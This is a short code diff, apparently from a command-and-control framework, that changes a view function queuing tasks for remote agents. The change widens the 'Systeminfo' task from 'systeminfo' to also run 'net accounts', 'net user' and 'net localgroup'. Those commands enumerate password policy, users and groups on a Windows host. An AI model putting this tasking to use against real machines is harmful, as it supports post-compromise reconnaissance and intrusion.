@@ -6,7 +6,7 @@ current_path= os.path.dirname(os.path.abspath(__file__))
 
 def Systeminfo(request, agent=''):
     if request.method=='POST':
-        task = 'echo "===============System-Info===============";systeminfo'
+        task = 'echo "===============System-Info===============";systeminfo;echo "===============Get Password Policy & Other Account Information===============";net accounts;echo "===============All system users===============";net user;echo "===============All system groups===============";net localgroup'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
